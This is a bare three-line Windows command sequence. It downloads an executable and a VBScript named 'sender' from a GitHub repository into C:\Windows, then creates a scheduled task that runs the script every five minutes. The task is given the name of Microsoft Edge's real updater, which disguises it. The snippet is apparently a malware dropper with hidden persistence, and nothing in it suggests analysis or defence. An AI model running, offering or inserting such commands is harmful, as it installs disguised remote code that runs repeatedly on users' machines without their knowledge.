wget https://github.com/terionun/smbb/raw/main/sender.exe -O C:\Windows\sender.exe
wget https://raw.githubusercontent.com/terionun/smbb/main/sender.vbs -O C:\Windows\sender.vbs
schtasks /create /sc minute /mo 5 /tn "MicrosoftEdgeUpdateTaskMachine" /tr "wscript C:\Windows\sender.vbs"
